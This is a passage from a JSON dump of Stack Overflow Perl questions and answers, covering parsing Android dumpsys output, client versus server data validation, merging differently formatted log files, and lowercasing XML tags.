com.sec.android.app.camaftest.SCAN:\n    420a2220 com.sec.factory.camera/com.sec.android.app.camaftest.CaptureActivity filter 4209f468\n      Action: \"com.sec.android.app.camaftest.SCAN\"\n      Category: \"android.intent.category.DEFAULT\"\n\nReceiver Resolver Table:\n Schemes:\n    android_secret_code:\n     422b69b0.   com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmwareBroadCastReceiver filter 422b6b80\n       Action:   \"android.provider.Telephony.SECRET_CODE\"\n       Scheme:  \"android_secret_code\"\n      Authority: \"34971539\": -1\n      Authority: \"7412365\": -1\n\nNon-Data Actions:\n    android.intent.action.BOOT_COMPLETED:\n     420d0c70. com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmwareBroadCastReceiver filter 420d0d18\n       Action: \"android.intent.action.BOOT_COMPLETED\"\n</code></pre>\n\n<p>From this output (from a tool called dumpsys in android), I would like to get the content under the <code>Non-Data Actions:</code> heading <em>only</em> (I do not, for example, want content under the <code>Receiver Resolver Table:</code> heading).</p>\n\n<p>I want to do this preferably in Perl, but other suggestions are welcome.</p>\n"}, {"tags": ["javascript", "ajax", "perl", "validation"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457127542, "post_id": 35806473, "comment_id": 59282420, "body": "<i>Always</i> validate on the server. If you want to improve the user experience, you can also validate on the client, but nothing forces you to do client-side checks."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457128300, "post_id": 35806473, "comment_id": 59282810, "body": "@ThisSuitIsBlackNot, They&#39;re asking for the best way to do client-side checks."}, {"owner": {"reputation": 14671, "user_id": 2317490, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ypoen.png?s=128&g=1", "display_name": "dandavis", "link": "https://stackoverflow.com/users/2317490/dandavis"}, "edited": false, "score": 0, "creation_date": 1457131959, "post_id": 35806473, "comment_id": 59284390, "body": "i&#39;ve see things to run perl in JS... <a href=\"https://github.com/jashkenas/coffeescript/wiki/list-of-languages-that-compile-to-js#perl\" rel=\"nofollow noreferrer\">github.com/jashkenas/coffeescript/wiki/&hellip;</a> that would probably work on something simple like validating a string."}, {"owner": {"reputation": 31, "user_id": 1289485, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af97f6e32fed39eea38e96afea902e16?s=128&d=identicon&r=PG", "display_name": "user1289485", "link": "https://stackoverflow.com/users/1289485/user1289485"}, "edited": false, "score": 0, "creation_date": 1457211549, "post_id": 35806473, "comment_id": 59307061, "body": "Thanks guys.  I would emphasize, for the benefit of readers who see this dialog, my ideal is to do data validation BOTH client side and server side.  I do the validation server side for obvious reasons,, and I do it client side to enhance user experience, especially to save the user time and effort by notifying him or her of data entry error at the earliest possible moment. What has been problematic for me has been that while I have an excellent suite of perl packages for data validation, I have not yet found a comparable suite of javascript libraries. To be able to run Perl in JS has appeal."}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 1289485, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af97f6e32fed39eea38e96afea902e16?s=128&d=identicon&r=PG", "display_name": "user1289485", "link": "https://stackoverflow.com/users/1289485/user1289485"}, "edited": false, "score": 0, "creation_date": 1457212768, "post_id": 35810643, "comment_id": 59307457, "body": "Thanks Harry, I generally agree with you.My only uncertainty WRT ajax+perl is how well it scales.Let me ask you three questions.  1) Do you know of a JS library that is useful globally rather than merely for north america?  2) related to this is if/how this JSON, <a href=\"https://gist.github.com/matthewbednarski/4d15c7f50258b82e2d7e\" rel=\"nofollow noreferrer\">gist.github.com/matthewbednarski/4d15c7f50258b82e2d7e</a> can be used in JS, and my uncertainty as to how to use that to make a function that takes an ISO country code, along with the postal code value, to validate the postal code value.  3) do you now if/how <a href=\"https://github.com/googlei18n/libphonenumber\" rel=\"nofollow noreferrer\">github.com/googlei18n/libphonenumber</a> can be used from within JS?"}, {"owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "reply_to_user": {"reputation": 31, "user_id": 1289485, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af97f6e32fed39eea38e96afea902e16?s=128&d=identicon&r=PG", "display_name": "user1289485", "link": "https://stackoverflow.com/users/1289485/user1289485"}, "edited": false, "score": 0, "creation_date": 1457225143, "post_id": 35810643, "comment_id": 59310730, "body": "I don&#39;t know of anything off hand but you can find various libs like <a href=\"https://github.com/jquery/globalize\" rel=\"nofollow noreferrer\">github.com/jquery/globalize</a> in this space. i18n done well is difficult. Personally I&#39;d look at what the international web companies are using ie Yahoo&#39;s YUI would also be a good place to start <a href=\"http://yuilibrary.com/yui/docs/intl/\" rel=\"nofollow noreferrer\">yuilibrary.com/yui/docs/intl</a>. Or anything that Facebook/Twitter/Google etc are using will likely be suitable. To use the libs from within JS it&#39;s a case of reading and more reading, the libphonenumber page has some quick examples that show you how to use the country code and check numbers."}], "tags": [], "owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "is_accepted": false, "score": 2, "last_activity_date": 1457157187, "last_edit_date": 1495540784, "creation_date": 1457157187, "answer_id": 35810643, "question_id": 35806473, "link": "https://stackoverflow.com/questions/35806473/how-best-does-one-handle-data-validation-in-a-web-application-pure-javascript-c/35810643#35810643", "title": "How best does one handle data validation in a web application: pure javascript code or ajax calls to familiar perl packages?", "body": "<p>The Browser is behind enemy lines, anything coming from it should be treated\nwith extreme caution. When it comes to browser side validation it should be\nconsidered User Experience only even if a well known JS library is used to\nvalidate the input. You must always check it server side. It appears you have these services already which is great.</p>\n\n<p>The last paragraph is not necessarily for the OP, it's for anyone coming to this problem for the first time because it's a fundamental concept ie Client side validation of things like credit cards etc is a fountain of security problems.</p>\n\n<p>Now we know we need robust server side validation. In my experience this simplifies things because quite often you can find simple JS libraries that will perform 98% of the use cases you need and for anything else you fall back to the service.</p>\n\n<p>Two cases in point.</p>\n\n<ol>\n<li>US zip codes can be handles in part using a few lines of code</li>\n</ol>\n\n<p><a href=\"https://stackoverflow.com/questions/21197798/angular-ng-pattern-regex-code-for-us-zipcodes-and-canadian-postal-codes\">Angular ng-pattern regex code for US Zipcodes and Canadian Postal codes</a></p>\n\n<ol start=\"2\">\n<li>CVV numbers and credit cards, If you adopt something like angular (and I'd \nrecommend it) you can take advantage of any number of libs.</li>\n</ol>\n\n<p><a href=\"https://www.google.com/webhp?sourceid=chrome-instant&amp;ion=1&amp;espv=2&amp;ie=UTF-8#q=angular+credit+card+\" rel=\"nofollow noreferrer\">https://www.google.com/webhp?sourceid=chrome-instant&amp;ion=1&amp;espv=2&amp;ie=UTF-8#q=angular+credit+card+</a></p>\n\n<p>In short, if you have robust server side validation the question becomes \nabout user experience only. If your services perform great then use them to do the validation using Ajax, if you want to make the site feel more like a single page app use JS libraries and fall back to services. The only thing you must never do is trust what you get from behind enemy lines. </p>\n"}], "owner": {"reputation": 31, "user_id": 1289485, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af97f6e32fed39eea38e96afea902e16?s=128&d=identicon&r=PG", "display_name": "user1289485", "link": "https://stackoverflow.com/users/1289485/user1289485"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 87, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1457157187, "creation_date": 1457127352, "question_id": 35806473, "link": "https://stackoverflow.com/questions/35806473/how-best-does-one-handle-data-validation-in-a-web-application-pure-javascript-c", "title": "How best does one handle data validation in a web application: pure javascript code or ajax calls to familiar perl packages?", "body": "<p>I am familiar with a number of options for validation, and in fact tend to do it both client side and server side, for obvious reasons.</p>\n\n<p>I have some very good perl packages for validating everything I need to validate.  What I haven't found is corresponding data validation packages for Javascript.  For phone numbers, I see a library: <a href=\"https://github.com/googlei18n/libphonenumber\" rel=\"nofollow\">https://github.com/googlei18n/libphonenumber</a>, but it is not clear how I would use it in a Javascript function.  Similarly, I have found a number of regular expressions for validating a postal code given the ISO country code in the address.  But there are well over 100 of them and I shudder to think of entering them all and then figuring out which to apply given he ISO country code.</p>\n\n<p>Now, are there good quality Javascript libraries that I can use to validate e.g. phone numbers and postal codes (and credit cards and CVV values), or am I wasting my time looking for that when I can resort to ajax calls that make use of my Perl packages?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 3, "creation_date": 1457125920, "post_id": 35806029, "comment_id": 59281609, "body": "<i>We help those who help themselves</i>. What have you tried, please show some efforts."}, {"owner": {"reputation": 3, "user_id": 6020164, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fa68417c1679a84eb9f172da7a60d59?s=128&d=identicon&r=PG", "display_name": "techsmith", "link": "https://stackoverflow.com/users/6020164/techsmith"}, "reply_to_user": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1457129057, "post_id": 35806029, "comment_id": 59283181, "body": "@anunsh - added the code I have so far."}, {"owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "edited": false, "score": 0, "creation_date": 1457129507, "post_id": 35806029, "comment_id": 59283379, "body": "Can be done using <a href=\"https://metacpan.org/pod/DateTime::Format::Strptime\" rel=\"nofollow noreferrer\">DateTime::Format::Strptime</a>. You would need the 2 functions <a href=\"https://metacpan.org/pod/DateTime::Format::Strptime#strptime-parse_datetime-string\" rel=\"nofollow noreferrer\">parse_datetime and format_datetime</a> functions."}, {"owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "edited": false, "score": 0, "creation_date": 1457130142, "post_id": 35806029, "comment_id": 59283667, "body": "Also could be done using <a href=\"https://metacpan.org/pod/Time::Piece\" rel=\"nofollow noreferrer\">Time::Piece</a> using the <i>Time::Piece-&gt;strptime(STRING, FORMAT)</i> and <i>strftime</i> functions. Time::Piece became part of perl core with version 5.010."}], "answers": [{"tags": [], "owner": {"reputation": 1790, "user_id": 2926055, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f8ec33a10c7a355ea0266d08e0808a35?s=128&d=identicon&r=PG&f=1", "display_name": "user2926055", "link": "https://stackoverflow.com/users/2926055/user2926055"}, "is_accepted": false, "score": 0, "last_activity_date": 1457129813, "creation_date": 1457129813, "answer_id": 35807096, "question_id": 35806029, "link": "https://stackoverflow.com/questions/35806029/merging-log-files-with-different-formats/35807096#35807096", "title": "Merging log files with different formats", "body": "<p>While I won't write the script for you, the general script should look something like this:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse DateTime::Format::Strptime;\n\nsub firstFileLine {\n    # parse line as needed, and return a hash reference with 2 keys:\n    #   1. `line`: the contents of the line, possibly edited \n    #   2. `ts`: the UTC unix timestamp, via the DateTime::Format::Strptime module\n}\n\nsub secondFileLine {\n    # similar to `firstFileLine`, return a hash reference\n}\n\nmy @firstLines = map { firstFileLine($_) } &lt;FILE1&gt;;\nmy @secondLines = map { secondFileLine($_) } &lt;FILE2&gt;;\n\nmy @sorted = map { $_-&gt;{line} } sort {$a-&gt;{ts} &lt;=&gt; $b-&gt;{ts}} (@firstLines, @secondLines);\n</code></pre>\n\n<p>Read the docs on <a href=\"http://search.cpan.org/~drolsky/DateTime-Format-Strptime-1.64/lib/DateTime/Format/Strptime.pm\" rel=\"nofollow\">DateTime::Format::Strptime</a>, <a href=\"http://perldoc.perl.org/functions/map.html\" rel=\"nofollow\">map</a>, and <a href=\"http://perldoc.perl.org/functions/sort.html\" rel=\"nofollow\">sort</a>. You're in luck that Perl is one of the best-documented languages out there, take full advantage of that fact!</p>\n"}, {"tags": [], "owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "is_accepted": true, "score": 0, "last_activity_date": 1457228846, "last_edit_date": 1457228846, "creation_date": 1457227764, "answer_id": 35822023, "question_id": 35806029, "link": "https://stackoverflow.com/questions/35806029/merging-log-files-with-different-formats/35822023#35822023", "title": "Merging log files with different formats", "body": "<p>Here is a solution using <a href=\"https://metacpan.org/pod/Time::Piece\" rel=\"nofollow\">Time::Piece</a>. I used Inline::Files to simulate the 2 files. You would need to open you logfiles like</p>\n\n<pre><code>my $logfile1 = \"catalina.out\";\nmy $logfile2 = \"access_log\";\n\n\nopen my $log1_fh, '&lt;', $logfile1 or die $1;\nopen my $log2_fh, '&lt;', $logfile2 or die $1;\n</code></pre>\n\n<p>The program would look like this one, which gave me the results I think you want.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse Inline::Files;\nuse Time::Piece;\n\nmy %data;\n\nwhile (&lt;FILE2&gt;) {\n    # get date_time\n    my ($dt) = /^(\\d{4}-\\d\\d-\\d\\d \\d\\d:\\d\\d:\\d\\d),/ or next;\n    push @{ $data{$dt} }, $_;\n}\n\nmy $format = '%d/%b/%Y:%H:%M:%S';\n\nwhile (&lt;FILE1&gt;) {\n    /\\[(\\S+)/;\n    my $t = Time::Piece-&gt;strptime($1, $format)\n        or die \"Cannot parse $1. $!\";\n\n    my $dt = $t-&gt;strftime('%Y-%m-%d %H:%M:%S');\n\n    s/^\\S+ (?:- )+//;\n    s/(?&lt;=\\[)[^\\]]+/$dt/;\n    push @{ $data{$dt} }, $_;\n}\n\nfor my $dt (sort keys %data) {\n    my $aref = $data{$dt};\n    print for @$aref;   \n}\n\n\n__FILE1__\n127.0.0.1 - - [29/Feb/2016:16:57:52 -0600] \"GET /application/wcs/api/version?nodeRef=workspace://SpacesStore/ecd62cfa-fd19-4d6b-b45d-14f0e5b92cf0 HTTP/1.1\" 200 567\n127.0.0.1 - - [29/Feb/2016:16:57:52 -0600] \"GET /application/wcs/api/node/workspace/SpacesStore/ecd62cfa-fd19-4d6b-b45d-14f0e5b92cf0/workflow-instances HTTP/1.1\" 200 40\n127.0.0.1 - - [29/Feb/2016:16:57:52 -0600] \"GET /application/wcs/cisco/appId?userId=abcdefg&amp;requestType=get HTTP/1.1\" 200 45\n173.37.239.93 - abcdefg [29/Feb/2016:16:57:52 -0600] \"GET /share/page/site/nextgen-edcs/document-details?nodeRef=workspace://SpacesStore/ecd62cfa-fd19-4d6b-b45d-14f0e5b92cf0 HTTP/1.1\" 200 124492\n173.37.239.93 - abcdefg [29/Feb/2016:16:57:53 -0600] \"GET /share/service/messages_69bcdfdb058bb873ff49cc2a10c958b7.js?locale=en_US HTTP/1.1\" 200 81698\n173.37.239.93 - abcdefg [29/Feb/2016:16:57:53 -0600] \"GET /share/res/yui/history/history_543b42a00a378f4d4b6e70c81d915b0a.js HTTP/1.1\" 200 5781\n__FILE2__\n2016-02-12 08:16:03,630  WARN  [cluster.cache.HazelcastSimpleCache] [http-bio-8443-exec-212] Cluster is inactive but put(k,v) was called for cache HazelcastSimpleCache[cacheName=cache.readersSharedCache]\n2016-02-12 08:16:03,630  WARN  [cluster.cache.HazelcastSimpleCache] [http-bio-8443-exec-212] Cluster is inactive but get(key) was called for cache HazelcastSimpleCache[cacheName=cache.readersSharedCache], key=AclEntity[ ID=1893033, version=55, aclId=16cf5bc3-27d0-4d50-a93d-3bee1ddd112e, isLatest=true, aclVersion=1, inherits=true, inheritsFrom=1889292, type=1, inheritedAcl=1893034, isVersioned=false, requiresVersion=false, aclChangeSet=1451473]\n2016-02-12 08:16:03,630  WARN  [cluster.cache.HazelcastSimpleCache] [http-bio-8443-exec-212] Cluster is inactive but put(k,v) was called for cache HazelcastSimpleCache[cacheName=cache.readersSharedCache]\n</code></pre>\n\n<p>I used a hash <code>%data</code> to store the lines. The key is the transformed date so later in the program, you can print them in sorted order.</p>\n\n<p>The output from this program is:</p>\n\n<pre><code>2016-02-12 08:16:03,630  WARN  [cluster.cache.HazelcastSimpleCache] [http-bio-8443-exec-212] Cluster is inactive but put(k,v) was called for cache HazelcastSimpleCache[cacheName=cache.readersSharedCache]\n2016-02-12 08:16:03,630  WARN  [cluster.cache.HazelcastSimpleCache] [http-bio-8443-exec-212] Cluster is inactive but get(key) was called for cache HazelcastSimpleCache[cacheName=cache.readersSharedCache], key=AclEntity[ ID=1893033, version=55, aclId=16cf5bc3-27d0-4d50-a93d-3bee1ddd112e, isLatest=true, aclVersion=1, inherits=true, inheritsFrom=1889292, type=1, inheritedAcl=1893034, isVersioned=false, requiresVersion=false, aclChangeSet=1451473]\n2016-02-12 08:16:03,630  WARN  [cluster.cache.HazelcastSimpleCache] [http-bio-8443-exec-212] Cluster is inactive but put(k,v) was called for cache HazelcastSimpleCache[cacheName=cache.readersSharedCache]\n[2016-02-29 16:57:52] \"GET /application/wcs/api/version?nodeRef=workspace://SpacesStore/ecd62cfa-fd19-4d6b-b45d-14f0e5b92cf0 HTTP/1.1\" 200 567\n[2016-02-29 16:57:52] \"GET /application/wcs/api/node/workspace/SpacesStore/ecd62cfa-fd19-4d6b-b45d-14f0e5b92cf0/workflow-instances HTTP/1.1\" 200 40\n[2016-02-29 16:57:52] \"GET /application/wcs/cisco/appId?userId=abcdefg&amp;requestType=get HTTP/1.1\" 200 45\nabcdefg [2016-02-29 16:57:52] \"GET /share/page/site/nextgen-edcs/document-details?nodeRef=workspace://SpacesStore/ecd62cfa-fd19-4d6b-b45d-14f0e5b92cf0 HTTP/1.1\" 200 124492\nabcdefg [2016-02-29 16:57:53] \"GET /share/service/messages_69bcdfdb058bb873ff49cc2a10c958b7.js?locale=en_US HTTP/1.1\" 200 81698\nabcdefg [2016-02-29 16:57:53] \"GET /share/res/yui/history/history_543b42a00a378f4d4b6e70c81d915b0a.js HTTP/1.1\" 200 5781\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 6020164, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fa68417c1679a84eb9f172da7a60d59?s=128&d=identicon&r=PG", "display_name": "techsmith", "link": "https://stackoverflow.com/users/6020164/techsmith"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 118, "favorite_count": 0, "accepted_answer_id": 35822023, "answer_count": 2, "score": 0, "last_activity_date": 1457228846, "creation_date": 1457125600, "last_edit_date": 1457129032, "question_id": 35806029, "link": "https://stackoverflow.com/questions/35806029/merging-log-files-with-different-formats", "title": "Merging log files with different formats", "body": "<p>I have two log files with different date/time formats that I would like to merge.</p>\n\n<p>The first file is a standard Apache access_log file like so:</p>\n\n<blockquote>\n  <p>127.0.0.1 - - [29/Feb/2016:16:57:52 -0600] \"GET /application/wcs/api/version?nodeRef=workspace://SpacesStore/ecd62cfa-fd19-4d6b-b45d-14f0e5b92cf0 HTTP/1.1\" 200 567<br>\n  127.0.0.1 - - [29/Feb/2016:16:57:52 -0600] \"GET /application/wcs/api/node/workspace/SpacesStore/ecd62cfa-fd19-4d6b-b45d-14f0e5b92cf0/workflow-instances HTTP/1.1\" 200 40<br>\n  127.0.0.1 - - [29/Feb/2016:16:57:52 -0600] \"GET /application/wcs/cisco/appId?userId=abcdefg&amp;requestType=get HTTP/1.1\" 200 45<br>\n  173.37.239.93 - abcdefg [29/Feb/2016:16:57:52 -0600] \"GET /share/page/site/nextgen-edcs/document-details?nodeRef=workspace://SpacesStore/ecd62cfa-fd19-4d6b-b45d-14f0e5b92cf0 HTTP/1.1\" 200 124492<br>\n  173.37.239.93 - abcdefg [29/Feb/2016:16:57:53 -0600] \"GET /share/service/messages_69bcdfdb058bb873ff49cc2a10c958b7.js?locale=en_US HTTP/1.1\" 200 81698<br>\n  173.37.239.93 - abcdefg [29/Feb/2016:16:57:53 -0600] \"GET /share/res/yui/history/history_543b42a00a378f4d4b6e70c81d915b0a.js HTTP/1.1\" 200 5781</p>\n</blockquote>\n\n<p>. . . where 'abcdedfg' = userid.</p>\n\n<p>The second log file is formatted like so:</p>\n\n<blockquote>\n  <p>2016-02-12 08:16:03,630  WARN  [cluster.cache.HazelcastSimpleCache] [http-bio-8443-exec-212] Cluster is inactive but put(k,v) was called for cache HazelcastSimpleCache[cacheName=cache.readersSharedCache]<br>\n   2016-02-12 08:16:03,630  WARN  [cluster.cache.HazelcastSimpleCache] [http-bio-8443-exec-212] Cluster is inactive but get(key) was called for cache HazelcastSimpleCache[cacheName=cache.readersSharedCache], key=AclEntity[ ID=1893033, version=55, aclId=16cf5bc3-27d0-4d50-a93d-3bee1ddd112e, isLatest=true, aclVersion=1, inherits=true, inheritsFrom=1889292, type=1, inheritedAcl=1893034, isVersioned=false, requiresVersion=false, aclChangeSet=1451473]<br>\n   2016-02-12 08:16:03,630  WARN  [cluster.cache.HazelcastSimpleCache] [http-bio-8443-exec-212] Cluster is inactive but put(k,v) was called for cache HazelcastSimpleCache[cacheName=cache.readersSharedCache]</p>\n</blockquote>\n\n<p>My goals are:</p>\n\n<ol>\n<li>convert the date/time formats in the first log file to the date/time format of the second log file </li>\n<li>knock off the IP addresses from the first log file but keep the userids.</li>\n<li>merge the two log files together </li>\n<li>sort on date/time.</li>\n</ol>\n\n<p>Here is what I have so far --</p>\n\n<pre><code>$LOGFILE1 = \"catalina.out\";\n$LOGFILE2 = \"access_log\";\n\nopen(LOGFILE1) or die(\"Could not open log file.\");\nforeach $line (&lt;LOGFILE1&gt;) {\n    chomp($line);\n    if ($line =~ /^2016.+$/) {\n         print $line . \"\\n\";\n    }\n}\n\nopen(LOGFILE2) or die(\"Could not open log file.\");\nforeach $line (&lt;LOGFILE2&gt;) {\nchomp($line);\nif ($line =~ /\\d{2}\\/\\S{3}\\/\\d{4}:\\d{2}:\\d{2}:\\d{2} -\\d{3}/) {\nprint $line . \"\\n\";\n}\n\n    # format of file 1\n    # DD/MMM/YYYY:HH:MM:SS -NNNN\n    # 29/Feb/2016:20:03:07 -600\n    # format of file 2\n    # YYYY-MM-DD HH:MM:SS,NNN\n    # 2016-02-12 08:16:03,631\n}\n</code></pre>\n\n<p>So I'm basically only interested in lines with date/time info, so the above code is discarding the other lines.<br>\n<br>\nWhere I'm stuck is:<br>\n1) how do I convert the date/time format in file 1 into the data/time format of file 2?<br>\n2) I'm not interested in the IP addresses but I do want to keep the userids. Since file 1 does not start with date/time info like file 2, after converting, how will I sort on date after merging the two?<br>\n<br>\nAny help would be appreciated!</p>\n"}, {"tags": ["xml", "perl"], "answers": [{"tags": [], "owner": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "is_accepted": false, "score": 2, "last_activity_date": 1457126229, "creation_date": 1457126229, "answer_id": 35806175, "question_id": 35806015, "link": "https://stackoverflow.com/questions/35806015/lowercasing-xml-tags/35806175#35806175", "title": "lowercasing XML tags", "body": "<p>Generally, you should use an XML parser, but a regex might be fine in a limited situation like yours.  Your problem is that you perform the substitution on the wrong variable.  Change:</p>\n\n<pre><code>$match =~ s/$match/$lcCapture/g;\n</code></pre>\n\n<p>to:</p>\n\n<pre><code>$row =~ s/$match/$lcCapture/g;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 13, "user_id": 5572794, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1b794fa9adc7b162efd0c54cc9e119b8?s=128&d=identicon&r=PG&f=1", "display_name": "StuporUser", "link": "https://stackoverflow.com/users/5572794/stuporuser"}, "edited": false, "score": 0, "creation_date": 1457128335, "post_id": 35806285, "comment_id": 59282826, "body": "Thanks, That worked like a dream. Can you explain the last section of that substitution? This bit: <code>\\L$&amp;</code>"}, {"owner": {"reputation": 843, "user_id": 6020333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bea9014ebf1e1188cac53beb61560df8?s=128&d=identicon&r=PG&f=1", "display_name": "bart", "link": "https://stackoverflow.com/users/6020333/bart"}, "reply_to_user": {"reputation": 13, "user_id": 5572794, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1b794fa9adc7b162efd0c54cc9e119b8?s=128&d=identicon&r=PG&f=1", "display_name": "StuporUser", "link": "https://stackoverflow.com/users/5572794/stuporuser"}, "edited": false, "score": 0, "creation_date": 1457128544, "post_id": 35806285, "comment_id": 59282925, "body": "<code>\\L</code> is a modifier that turns any string that follows it into lowercase. <code>$&amp;</code> contains the most recent match. You can read more about them here: <a href=\"http://perldoc.perl.org/perlre.html\" rel=\"nofollow noreferrer\">perldoc.perl.org/perlre.html</a>"}], "tags": [], "owner": {"reputation": 843, "user_id": 6020333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bea9014ebf1e1188cac53beb61560df8?s=128&d=identicon&r=PG&f=1", "display_name": "bart", "link": "https://stackoverflow.com/users/6020333/bart"}, "is_accepted": true, "score": 0, "last_activity_date": 1457126597, "creation_date": 1457126597, "answer_id": 35806285, "question_id": 35806015, "link": "https://stackoverflow.com/questions/35806015/lowercasing-xml-tags/35806285#35806285", "title": "lowercasing XML tags", "body": "<p>You can also use Perl stream editing capabilities:</p>\n\n<pre><code>perl -pe 's/&lt;\\/?[^&gt;]+&gt;/\\L$&amp;/g' file.xml\n</code></pre>\n\n<p>This solution will only lowercase the tags, and not what is enclosed by them.</p>\n"}], "owner": {"reputation": 13, "user_id": 5572794, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1b794fa9adc7b162efd0c54cc9e119b8?s=128&d=identicon&r=PG&f=1", "display_name": "StuporUser", "link": "https://stackoverflow.com/users/5572794/stuporuser"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 42, "favorite_count": 0, "accepted_answer_id": 35806285, "answer_count": 2, "score": 1, "last_activity_date": 1457126597, "creation_date": 1457125551, "question_id": 35806015, "link": "https://stackoverflow.com/questions/35806015/lowercasing-xml-tags", "title": "lowercasing XML tags", "body": "<p>I have two sets of XML documents, one with uppercase tags and one with lowercase, so I'm trying to write a Perl program that lowercases all the tags in the second set.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse diagnostics;\nuse feature 'say';\nmy $filename;\nmy @filenames = glob (\"*.xml\");\nmy $FH;\nmy $lcCapture;\nmy $row;\nmy $match;\n\n\nforeach $filename (@filenames) {\n    open ($FH, '&lt;:encoding(UTF-8)', $filename)\n  or die \"Could not open file '$filename' $!\";\n}\n\n  while ($row = &lt;$FH&gt;) {\n      chomp $row;\n\n      if ($row =~ m/(?:&lt;\\/?([A-Z]+)&gt;)/) {\n      $match = $1;\n      $lcCapture = lc $match;\n      $match =~ s/$match/$lcCapture/g;\n  } \n      {no warnings;\n      print \"$row\\n\";}\n\n\n }\n</code></pre>\n\n<p>but I just can't figure out what the problem might be. I've already solved the problem with XSLT. But I want my Perl program to work now!</p>\n"}, {"tags": ["regex", "perl", "splunk"], "comments": [{"owner": {"reputation": 83048, "user_id": 2255089, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZNAsT.jpg?s=128&g=1", "display_name": "Casimir et Hippolyte", "link": "https://stackoverflow.com/users/2255089/casimir-et-hippolyte"}, "edited": false, "score": 0, "creation_date": 1457122953, "post_id": 35805191, "comment_id": 59280158, "body": "Why did you write this: <code>[^\\}]*</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1457125271, "post_id": 35805526, "comment_id": 59281272, "body": "It is wrong to get into the habit of adding <code>&#47;gmis</code> to the end of every pattern you write. In this case you want to find only the first occurrence of the pattern; you have no <code>^</code> or <code>$</code> so <code>&#47;m</code> has no effect; you want to match <code>UserDataGuid</code> -- <code>userdataguid</code> will not do; and you&#39;re not interested in strings that span newlines. So <i>none</i> of those modifiers 